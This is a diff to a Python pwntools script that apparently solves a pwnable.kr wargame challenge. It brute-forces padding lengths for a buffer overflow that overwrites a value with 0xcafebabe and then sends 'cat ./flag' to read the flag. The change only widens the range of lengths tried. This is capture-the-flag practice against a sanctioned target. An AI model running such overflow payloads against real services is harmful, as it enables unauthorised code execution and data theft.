@@ -3,7 +3,7 @@
 from pwn import *
 
 
-for i in range(32,100):
+for i in range(32,133):
         p= remote("pwnable.kr","9000")
         p.sendline("A"*i+"\xca\xfe\xba\xbe"[::-1])
         p.sendline("cat ./flag")
